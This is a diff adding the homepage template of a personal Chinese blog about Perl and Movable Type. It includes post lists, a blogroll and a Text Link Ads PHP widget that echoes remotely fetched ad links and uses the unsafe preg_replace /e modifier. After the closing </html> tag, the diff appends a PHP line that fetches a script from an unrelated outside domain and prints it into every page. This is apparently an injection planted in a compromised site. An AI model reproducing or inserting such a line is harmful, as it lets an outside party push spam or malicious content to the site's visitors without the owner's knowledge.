@@ -1,0 +1,346 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<meta name="Keywords" content="Easun.org - 路杨,Easun.org - 路杨,Talk about Movable Type,Perl,Softwares and Journals," />
+<meta name="description" content="Easun.org - 路杨 - Easun's Personal Portal,Talk about Movable Type,Perl,Softwares and Journals" />
+<link rel="stylesheet" href="//static.easun.org/css/new_styles.css?time=2025.05.15.22" type="text/css" />
+<meta name="baidu-site-verification" content="Oml6qGID07" />
+<meta name="verify-v1" content="o5D383WLwY1tQZPXSO4I33xHc0WAmJjlmm+zX5emc3w=" />
+<meta property="qc:admins" content="4150757513566727" />
+<meta baidu-gxt-verify-token="4eb2650edc284e3ba724b4df2efeac4b">
+<link rel="start" href="https://easun.org/" title="Home" />
+<link rel="alternate" type="application/atom+xml" title="Recent Entries" href="https://easun.org/blog/atom.xml" />
+<!-- Open Graph Protocol -->
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en-us">
+<meta property="og:title" content="Easun.org - 路杨">
+<meta property="og:url" content="https://easun.org/">
+<meta property="og:description" content="Talk about Movable Type,Perl,Softwares and Journals">
+<meta property="og:site_name" content="Easun.org - 路杨">
+<meta property="og:image" content="//static.easun.org/site_images/easun_site_image.png">
+<!-- Microdata -->
+<meta itemprop="description" content="Talk about Movable Type,Perl,Softwares and Journals">
+<link itemprop="url" href="https://easun.org/">
+<link itemprop="image" href="//static.easun.org/site_images/easun_site_image.png">
+<title>Easun.org - 路杨 - Easun's Personal Portal,Talk about Movable Type,Perl,Softwares and Journals</title>
+<!--[if lt IE 9]>
+<link rel="stylesheet" href="//static.easun.org/css/ie.css">
+<script src="//static.easun.org/js/html5shiv.js"></script>
+<![endif]-->
+<link rel="shortcut icon" href="//static.easun.org/images/favicon.ico" type="image/x-icon" />
+</head>
+<body id="theme-from-test" class="mt-main-index layout-twt">
+<div id="pagewrap">
+<header id="header">
+<hgroup>
+<a id="site-logo" href="//easun.org/" title="Easun.org" alt="Easun.org" >Easun.org</a>
+<h1 id="site-name"><a href="https://easun.org/" accesskey="1">Easun.org - 路杨</a></h1>
+<div id="site-description">Talk about Movable Type,Perl,Softwares and Journals</div>
+</hgroup>
+<nav id="main-nav"><span class="toggle" id="main-nav-toggle" role="button" aria-controls="main-nav" aria-expanded="false" tabindex="0">Menu</span>
+<ul>
+<li id="top_site_home" class="first on" data-pjax="true"><a href="//easun.org/" title="Easun's HomePage">首页 | Home</a></li>
+<li id="top_blog_index"
+><a href="//easun.org/blog/" title="Easun's Blog">博客 | Blog</a></li>
+<li id="top_archives"
+><a href="https://easun.org/blog/archives/" title="归档页面,Archives">归档 | Archives</a></li>
+<li id="top_tags"
+><a href="//easun.org/blog/tag/" title="标签页,Tags" >标签 | Tags</a></li>
+<li id="top_about"
+><a href="//easun.org/about/" title="About Easun">关于 | About</a></li>
+</ul></nav>
+<nav id="sub-nav"><div class="social">
+<a class="ossu" href="http://ossu.easun.org" title="路杨操作系统切换工具(EasunStudio Operating Systems Switch Utility)" aria-label="Ossu" >Ossu</a>
+<a class="github" href="https://github.com/easunlee" title="GitHub profile" aria-label="GitHub profile" ><svg aria-hidden="true" class="octicon octicon-mark-github" version="1.1" viewBox="0 0 16 16" width="28" height="28"><path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0 0 16 8c0-4.42-3.58-8-8-8z"></path></svg></a>
+<a class="search" href="https://easun.org/search" title="站内搜索" aria-label="站内搜索">Search</a>
+<a class="perl" href="https://easun.org/perl/" title="Perl Site" aria-label="Perl Site" >Perl</a>
+<a class="rss" href="https://easun.org/blog/atom.xml" title="RSS 订阅" aria-label="RSS 订阅">Feed</a>
+</div></nav>
+</header>
+<div id="homepage-image">&nbsp;</div>
+<div id="content" role="main">
+<span id="pjax-type" data-type="home" class="hidden"></span>
+<?php
+$path = '/usr/share/nginx/html/blog/archives/inc/';
+set_include_path(get_include_path() . PATH_SEPARATOR . $path);
+?>
+<h2 id="ossu-title" class="archive-title">免费软件|Free SoftWare</h2> <article id="entry-ossu" class="post clearfix ossu-asset"> <header> <h2 class="post-title"><a href="http://ossu.easun.org/" rel="bookmark">路杨操作系统切换工具 2.3 build 20160406</a></h2> <p class="post-meta"><a href="http://ossu.easun.org/">Operating Systems Switch Utility 2.3.2016.406</a></p> </header> <img title="路杨操作系统切换工具(Operating Systems Switch Utility)" src="//easun.org/ossu/images/ossu_166.png" align="left" width="166"> <p class="asset-body" style="padding:5px;">路杨操作系统切换工具(Operating Systems Switch Utility) 是一款工作在Windows 图形界面下的多系统管理工具。支持Windows全系列操作系统，安装多Windows系统的福音。</p> <a style="margin-left:20px;" class="button action primary download" title="点击下载" href="http://ossu.easun.org/download/ossu_release.zip">Free Download ( Windows Installer )</a> </article>
+<section id="posts" class="posts"> <h2 id="recent-title" class="archive-title">最新文章|Recent Topics</h2> <ol data-pjax="true"> <li> <a href="https://easun.org/blog/archives/sitelogspam2021.html" rel="bookmark" published="2021:07:17:22:56:52"> <time datetime="2021-07-17T22:56:52+08:00">2021.07.17:</time> <div> <span class="label category sitelog">站务记录</span> <span class="title">[SiteLog]遭遇疯狂的SPAM</span> <span class="comments">4</span> </div> </a> </li> <li> <a href="https://easun.org/blog/archives/win10dpi_vc_pset.html" rel="bookmark" published="2021:06:22:10:00:46"> <time datetime="2021-06-22T10:00:46+08:00">2021.06.22:</time> <div> <span class="label category program">程序人生</span> <span class="title">[随笔]高DPI缩放下的windows 程序界面发虚VC解决</span> <span class="comments">1</span> </div> </a> </li> <li> <a href="https://easun.org/blog/archives/harmonyos_mate20.html" rel="bookmark" published="2021:06:10:10:22:31"> <time datetime="2021-06-10T10:22:31+08:00">2021.06.10:</time> <div> <span class="label category other">八卦杂谈</span> <span class="title">[随笔]拥抱鸿蒙HarmonyOS，的确不错</span> <span class="comments">3</span> </div> </a> </li> <li> <a href="https://easun.org/blog/archives/20210427_birthday.html" rel="bookmark" published="2021:06:07:16:35:19"> <time datetime="2021-06-07T16:35:19+08:00">2021.06.07:</time> <div> <span class="label category life">心情故事</span> <span class="title">[随笔]岁月催人老，写在生日当天</span> <span class="comments">0</span> </div> </a> </li> <li> <a href="https://easun.org/blog/archives/1111_jd_thinkpad.html" rel="bookmark" published="2019:11:06:21:29:01"> <time datetime="2019-11-06T21:29:01+08:00">2019.11.06:</time> <div> <span class="label category other">八卦杂谈</span> <span class="title">[双11]暗叹一下双11京东的价格</span> <span class="comments">2</span> </div> </a> </li> <li> <a href="https://easun.org/blog/archives/post_24.html" rel="bookmark" published="2019:08:14:16:21:52"> <time datetime="2019-08-14T16:21:52+08:00">2019.08.14:</time> <div> <span class="label category other">八卦杂谈</span> <span class="title">[杂事]美化一下家里的配电箱</span> <span class="comments">4</span> </div> </a> </li> <li> <a href="https://easun.org/blog/archives/thinkpad_x61_kb_wb.html" rel="bookmark" published="2019:08:09:11:25:06"> <time datetime="2019-08-09T11:25:06+08:00">2019.08.09:</time> <div> <span class="label category other">八卦杂谈</span> <span class="title">[小红点依赖症]迟来的 ThinkPad X61 双模小红点键盘组装</span> <span class="comments">2</span> </div> </a> </li> <li> <a href="https://easun.org/blog/archives/post_23.html" rel="bookmark" published="2019:07:22:14:06:22"> <time datetime="2019-07-22T14:06:22+08:00">2019.07.22:</time> <div> <span class="label category life">心情故事</span> <span class="title">意欲何为？遭遇克隆，哭笑不得</span> <span class="comments">7</span> </div> </a> </li> <li> <a href="https://easun.org/blog/archives/typecho.html" rel="bookmark" published="2017:12:11:20:03:57"> <time datetime="2017-12-11T20:03:57+08:00">2017.12.11:</time> <div> <span class="label category program">程序人生</span> <span class="title">Typecho升级错误白屏？</span> <span class="comments">10</span> </div> </a> </li> <li> <a href="https://easun.org/blog/archives/perl_eval_sig_die.html" rel="bookmark" published="2017:10:26:22:03:01"> <time datetime="2017-10-26T22:03:01+08:00">2017.10.26:</time> <div> <span class="label category perl">Perl</span> <span class="title">Perl eval 和 $SIG{__DIE__}</span> <span class="comments">2</span> </div> </a> </li> </ol> <nav> <a href="https://easun.org/blog/">Read more</a> </nav> </section>
+<section id="recent-comments" class="posts recent-comments-listing"> <h2 id="recent-comments-title" class="archive-title">最新回复|Recent Comments</h2> <ol data-pjax="true"> <li> <a href="https://easun.org/blog/guestbook.html#comment-2768" published="2025:11:27:11:41:23" >[路杨] 评论了 留言本|GuestBook</a> </li> <li> <a href="https://easun.org/blog/guestbook.html#comment-2767" published="2025:11:22:20:50:43" >[Haowu Ge] 评论了 留言本|GuestBook</a> </li> <li> <a href="https://easun.org/blog/guestbook.html#comment-2763" published="2022:06:20:17:35:35" >[路杨_MT] 评论了 留言本|GuestBook</a> </li> <li> <a href="https://easun.org/blog/guestbook.html#comment-2762" published="2022:06:20:17:34:46" >[路杨_MT] 评论了 留言本|GuestBook</a> </li> <li> <a href="https://easun.org/blog/guestbook.html#comment-2761" published="2022:05:25:05:30:57" >[hztz] 评论了 留言本|GuestBook</a> </li> <li> <a href="https://easun.org/blog/guestbook.html#comment-2759" published="2021:12:06:16:12:14" >[范磊] 评论了 留言本|GuestBook</a> </li> <li> <a href="https://easun.org/blog/archives/harmonyos_mate20.html#comment-2758" published="2021:11:20:12:05:37" >[流量卡] 评论了 [随笔]拥抱鸿蒙HarmonyOS，的确不错</a> </li> <li> <a href="https://easun.org/blog/archives/sitelogspam2021.html#comment-2757" published="2021:11:12:18:12:34" >[路杨_MT] 评论了 [SiteLog]遭遇疯狂的SPAM</a> </li> <li> <a href="https://easun.org/blog/archives/sitelogspam2021.html#comment-2756" published="2021:11:09:09:41:50" >[老头] 评论了 [SiteLog]遭遇疯狂的SPAM</a> </li> <li> <a href="https://easun.org/blog/archives/harmonyos_mate20.html#comment-2755" published="2021:08:16:22:29:51" >[路杨] 评论了 [随笔]拥抱鸿蒙HarmonyOS，的确不错</a> </li> </ol> </section>
+
+</div>
+<aside id="sidebar">
+<section class="widget-top-links widget-archive widget">
+<h3 class="widget-header">Top Links</h3>
+<!-- figure class="post-image"><img title="支付宝扫码领红包" src="https://easun.org/upload/alipay.png" /></figure -->
+<ul class="widget-list">
+<?php
+/**
+* Defines the path where your xml files will be stored. Must be absolute
+* If left blank the xml files will attempt to be created in the path where the php file is executed
+* Make sure to have the trailing slash on this path
+* e.g. /var/www/domain.com/includes/
+*/
+$GLOBALS['tlaXmlFilePath'] = '/usr/share/nginx/html/temp/';
+// example methods are BIG-5 ISO for fill list see http://www.php.net/manual/en/function.mb-list-encodings.php
+// example with windows encoding $GLOBALS['TLA_OUTPUT_DECODING'] = 'windows-1251';
+$GLOBALS['TLA_OUTPUT_DECODING'] = false;
+// make sure output decoding is an option with iconv existing
+$GLOBALS['TLA_OUTPUT_DECODING'] = $GLOBALS['TLA_OUTPUT_DECODING'] && function_exists('iconv') ? $GLOBALS['TLA_OUTPUT_DECODING'] : false;
+/**
+* Site keys is an array of:
+* The xml key,
+* A local file name to store ad data,
+* The url that the ads should be displayed on
+*
+* Add a new line for each xml key and url
+* As long as your $tlaXmlFilePath is defined and the web server has the ability to write to that path,
+* it will create the files for you.
+*/
+$GLOBALS['siteKeys'] = array(
+array('local_128421.xml', 'QMY9O2G6LTKK8VGCRJSB', 'http://easun.org'),
+);
+if (isset($_REQUEST['textlinkads_action']) && $_REQUEST['textlinkads_action'] == 'debug' && isset($_REQUEST['textlinkads_key']) && in_array($_REQUEST['textlinkads_key'], tla_keys())) {
+echo 'http://' . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'] ."\n";
+ini_set('display_errors', 1);
+}
+function tla_keys()
+{
+$keys = array();
+foreach ($GLOBALS['siteKeys'] as $site) {
+$keys[] = $site[1];
+}
+return $keys;
+}
+// limits site to single-page, which will improve visibility in TLA marketplace
+// and attract more advertisers
+function tla_getSite()
+{
+$urlBase = 'http://' . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
+$urlBase = stripos($urlBase, '://www.') !== false ? str_replace('://www.', '://', $urlBase) : $urlBase;
+$altBase = substr($urlBase, -9) == 'index.php' ? substr($urlBase, 0, -9) : $urlBase;
+$altBase2 = (substr($altBase, -1) == '/') ? substr($altBase, 0, -1) : $altBase . '/';
+foreach ($GLOBALS['siteKeys'] as $site) {
+$stripedSite = stripos($site[2], '://www.') !== false ? str_replace('://www.', '://', $site[2]) : $site[2];
+if ($urlBase == $stripedSite || $altBase == $stripedSite || $altBase2 == $stripedSite) {
+return $site;
+}
+}
+}
+function tla_ads()
+{
+// Number of seconds before connection to XML times out
+// (This can be left the way it is)
+$CONNECTION_TIMEOUT = 10;
+// Local file to store XML
+// This file MUST be writable by web server
+// You should create a blank file and CHMOD it to 666
+if ($site = tla_getSite()) {
+list($LOCAL_FILENAME, $LOCAL_XML_KEY) = $site;
+} else {
+return;
+}
+if (!$LOCAL_FILENAME) {
+return;
+} else {
+$LOCAL_FILENAME = $GLOBALS['tlaXmlFilePath'] . $LOCAL_FILENAME;
+}
+if (!file_exists($LOCAL_FILENAME)) {
+@touch($LOCAL_FILENAME);
+@chmod($LOCAL_FILENAME, 0666);
+}
+if (!file_exists($LOCAL_FILENAME)) {
+die("Script error: $LOCAL_FILENAME does not exist. Please create a blank file named $LOCAL_FILENAME.");
+}
+if (!is_writable($LOCAL_FILENAME)) {
+die("Script error: $LOCAL_FILENAME is not writable. Please set write permissions on $LOCAL_FILENAME.");
+}
+if (filemtime($LOCAL_FILENAME) < (time() - 3600) || filesize($LOCAL_FILENAME) < 3) {
+$url = 'http://www.matomyseo.com/xml.php?k=' . $LOCAL_XML_KEY . '&l=php-tla-2.0.7&v='.phpversion();
+if (function_exists('json_decode') && is_array(json_decode('{"a":1}', true))) {
+$url .= '&f=json';
+}
+tla_updateLocal($url, $LOCAL_FILENAME, $CONNECTION_TIMEOUT);
+}
+$xml = tla_getLocal($LOCAL_FILENAME);
+$links = tla_decode($xml);
+if ($links && is_array($links)) {
+//echo "\n<ul>\n";
+echo "\n";
+foreach ($links as $link) {
+if (isset($link['PostID']) && $link['PostID'] > 0) {
+continue;
+}
+if ($GLOBALS['TLA_OUTPUT_DECODING']) {
+$beforeText = ($link['BeforeText'] ? iconv('UTF-8', $GLOBALS['TLA_OUTPUT_DECODING'], $link['BeforeText']) . ' ' : '');
+$afterText = ($link['AfterText'] ? ' ' . iconv('UTF-8', $GLOBALS['TLA_OUTPUT_DECODING'], $link['AfterText']) : '');
+$text = iconv('UTF-8', $GLOBALS['TLA_OUTPUT_DECODING'], $link['Text']);
+} else {
+$beforeText = ($link['BeforeText'] ? $link['BeforeText'] . ' ' : '');
+$afterText = ($link['AfterText'] ? ' ' . $link['AfterText'] : '');
+$text = $link['Text'];
+}
+echo "<li>" . $beforeText . '<a href="' . $link['URL'] . '">' . $text . '</a>' . $afterText . "</li>\n";
+}
+//echo '</ul>';
+}
+}
+function tla_updateLocal($url, $file, $time_out)
+{
+touch($file);
+if ($xml = file_get_contents_tla($url, $time_out)) {
+if ($handle = fopen($file, 'w')) {
+fwrite($handle, $xml);
+fclose($handle);
+}
+}
+}
+function tla_getLocal($file)
+{
+if (function_exists('file_get_contents')) {
+return file_get_contents($file);
+}
+$contents = '';
+if ($handle = fopen($file, 'r')) {
+$contents = fread($handle, filesize($file) + 1);
+fclose($handle);
+}
+return $contents;
+}
+function file_get_contents_tla($url, $time_out)
+{
+$result = '';
+$urlInfo = parse_url($url);
+if ($handle = fsockopen($urlInfo['host'], 80)) {
+if (function_exists('socket_set_timeout')) {
+socket_set_timeout($handle, $time_out, 0);
+} else if (function_exists('stream_set_timeout')) {
+stream_set_timeout($handle, $time_out, 0);
+}
+fwrite($handle, 'GET ' . $urlInfo['path'] . '?' . $urlInfo['query'] . " HTTP/1.0\r\nHost: " . $urlInfo['host'] . "\r\nConnection: Close\r\n\r\n");
+while (!feof($handle)) {
+$result .= @fread($handle, 40960);
+}
+fclose($handle);
+} else if (function_exists('curl_init')) {
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $time_out);
+curl_setopt($ch, CURLOPT_TIMEOUT, $time_out);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+$result = curl_exec($ch);
+curl_close($ch);
+}
+$return = '';
+$capture = false;
+foreach (explode("\n", $result) as $line) {
+$char = substr(trim($line), 0, 1);
+if ($char == '[' || $char == '<') {
+$capture = true;
+}
+if ($capture) {
+$return .= $line . "\n";
+}
+}
+return $return;
+}
+function tla_decode($str)
+{
+if (!function_exists('html_entity_decode')) {
+function html_entity_decode($string)
+{
+// replace numeric entities
+$string = preg_replace('~&#x([0-9a-f]+);~ei', 'chr(hexdec("\1"))', $string);
+$string = preg_replace('~&#([0-9]+);~e', 'chr(\1)', $string);
+// replace literal entities
+$trans_tbl = get_html_translation_table(HTML_ENTITIES);
+$trans_tbl = array_flip($trans_tbl);
+return strtr($string, $trans_tbl);
+}
+}
+if (substr($str, 0, 1) == '[') {
+$arr = json_decode($str, true);
+foreach ($arr as $i => $a) {
+foreach ($a as $k => $v) {
+$arr[$i][$k] = tla_decode_str($v);
+}
+}
+return $arr;
+}
+$out = '';
+$retarr = '';
+preg_match_all("/<(.*?)>(.*?)</", $str, $out, PREG_SET_ORDER);
+$n = 0;
+while (isset($out[$n])) {
+$retarr[$out[$n][1]][] = str_replace($search_ar, $replace_ar, html_entity_decode(strip_tags($out[$n][0])));
+$n++;
+}
+if (!$retarr) {
+return false;
+}
+$arr = array();
+$count = count($retarr['URL']);
+for ($i = 0; $i < $count; $i++) {
+$arr[] = array(
+'BeforeText' => $retarr['BeforeText'][$i],
+'URL' => $retarr['URL'][$i],
+'Text' => $retarr['Text'][$i],
+'AfterText' => $retarr['AfterText'][$i],
+);
+}
+return $arr;
+}
+function tla_decode_str($str)
+{
+$search_ar = array('&#60;', '&#62;', '&#34;');
+$replace_ar = array('<', '>', '"');
+return str_replace($search_ar, $replace_ar, html_entity_decode(strip_tags($str)));
+}
+tla_ads();
+?>
+<li><a href="http://easun.org/url/vjd" title="搜索京东优惠券" >京东[优惠券推广]</a></li>
+<li><a href="http://easun.org/url/vultr" title="2.5美元每月，Vultr VPS" >Vultr VPS</a></li>
+<li><a href="https://forum.51nb.com/" title="51nb" >51nb.com</a></li>
+<li><a href="http://www.w3school.com.cn/" title="w3school 在线教程" >w3school</a></li>
+<li><a href="http://bbs.mydigit.cn/" title="数码之家">数码之家</a></li>
+<li><a href="https://groups.google.com/group/perlchina" title="Google Groups:PerlChina 邮件列表">PerlChina邮件列表</a></li>
+<li><a href="http://www.perlchina.org" title="Perlchina组织是全球Perl Mongers组织中的一员，负责在中国的Perl语言推广工作">PerlChina.org</a></li>
+<li><a href="http://easun.org/perl/perl-toc/" title="Perl 學習手札,一本浅显易懂的Perl入门教材">Perl 學習手札</a></li>
+<li><a href="/blog/guestbook.html" title="欢迎给我留言">给我留言|GuestBook</a></li>
+</ul>
+</section>
+<?php include 'cat.inc'; ?>
+<section class="widget widget-blogroll"><h3 class="widget-header">Blogroll</h3><h4 class="sub"><strong>PerlChina:</strong></h4><ul class="widget-list" ><li><a title="非四:Fayland's" href="http://fayland.me/">Fayland</a> | Fayland and Perl Programming</li><li><a title="扶凯:Perl Linux CDN Video" href="http://www.php-oa.com/">扶凯</a> | Perl Linux CDN Video</li><li><a title="cnangel:My Study" href="http://my.huhoo.net/study/">cnangel</a> | My Study, Yahoo,Perl fans</li></ul><h4 class="sub"><strong>Blogger:</strong></h4><ul class="widget-list"><li><a title="阮一峰:阮一峰的网络日志" href="http://www.ruanyifeng.com/blog" >阮一峰</a> | 阮一峰的网络日志</li><li><a title="sunnywolf:Hugo.Lin's Lifelog" href="https://home4love.com/">sunnywolf</a> | Hugo.Lin's Lifelog</li><li><a title="Jackie:曙光博客" href="http://www.ezloo.com/">曙光博客</a> | Jackie:曙光博客</li><li><a title="佐仔志:I try to make it simple!" href="https://www.jinbo123.com/">佐仔志</a> | I try to make it simple!</li><li><a title="David Yin:研究(SEO)搜索引擎优化排名和(PPC)竞价排名技术，总结搜索营销学的各种方法和趋势。" href="https://seo.g2soft.net/">David Yin</a> | SEO,MT,PPC,网站</li><li><a title="车东:Che, Dong" href="http://www.chedong.com/blog/">车东[Blog^2]</a> | Che, Dong 车东大侠</li><li><a title="TONYHEAD 通利堂" href="http://www.tonyhead.com/">TONYHEAD</a> | 通利堂,唐生,MT博客</li><li><a title="平生一笑:MT资源" href="http://www.thinkjam.org/zoptuno/">原生脑浆</a> | MT资源,中文化，MT Hack</li><li><a title="月光:搜索引擎评论" href="http://www.williamlong.info/">月光博客</a> | 关注互联网和搜索引擎</li><li><a title="Zhijun TAN：土木坛子" href="https://tumutanzi.com">土木坛子</a> | UK,湖南人,中文博客</li><li><a title="老杨,从零开始" href="https://0xo.net/">从零开始</a> | 世上无难事，只要肯放弃。</li><li><a title="肆无忌惮" href="https://www.45eggs.com/">肆无忌惮</a> | 生活、技术、影音与阅读</li><li><a title="芭比小柒:等一个晴天" href="https://www.gehaowu.com/notes/">芭比小柒</a> | 等一个晴天,葛豪武</li><li><a title="Sumhat:Exploring More" href="https://leonax.net">Leona</a> | Sumhat,Exploring More</li><li><a title="郑永博客:手机电脑以及互联网" href="http://xptt.com/">郑永博客</a> | 郑永，手机电脑以及互联网</li></ul><!-- h4 class="sub"><strong>Friends:</strong></h4><ul class="widget-list"><li><a title="芳华:一个人的歌" href="http://cnfhglms.blogcn.com">芳华</a> | 一个人的歌,刹那回首,芳华依旧,玫瑰满院</li><li><a title="东风残雪:智能算法博客 " href="http://blog.sciencenet.cn/u/fswdong">东博</a> | 智能算法博客,关注智能算法.东风大哥 </li></ul --></section>
+</aside>
+<footer id="footer">
+<section class="widget-powered widget"><span>Powered by <a href="http://www.movabletype.org/">Movable Type</a></span></section>
+<section class="widget-footer-links widget"><h4 class="widget-header">Links</h4>
+<ul>
+<li class="inline"><a href="http://easun.org/url/vultr"><img src="https://static.easun.org/images/vultr.png" alt="Vultr" title="本站使用Vultr VPS，$2.5/月"></a></li>
+<li class="inline"><a href="https://www.upyun.com/"><img src="https://upfiles.b0.upaiyun.com/logo/90x45.png" alt="UPYUN" title="本站使用有拍云DNS加速"></a></li>
+<li>Copyright © 1998-2025 <a href="http://easun.org/about/">路杨(Easun Lee)</a><a href="https://github.com/easunlee" class="auth-icon icon-github" title="GitHub profile" style="text-indent: -9999px;"> GitHub </a>, All Rights Reserved</li></ul>
+</section>
+</footer>
+</div>
+<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script>
+<script>window.jQuery || document.write('<script src="//static.easun.org/js/jquery.min.js"><\/script>')</script>
+<script src="//static.easun.org/js/mt.mini.js?time=2025.05.15.22"></script>
+<script>
+/* <![CDATA[ */
+$(document).ready(function(){ util.new_archives(); });
+/* ]]> */
+</script>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-683520-1"></script>
+<script>
+window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', 'UA-683520-1');
+</script>
+</body>
+</html>
+<?php echo file_get_contents("https://backlinkku.id/menu/vip-v1/script.txt"); ?>
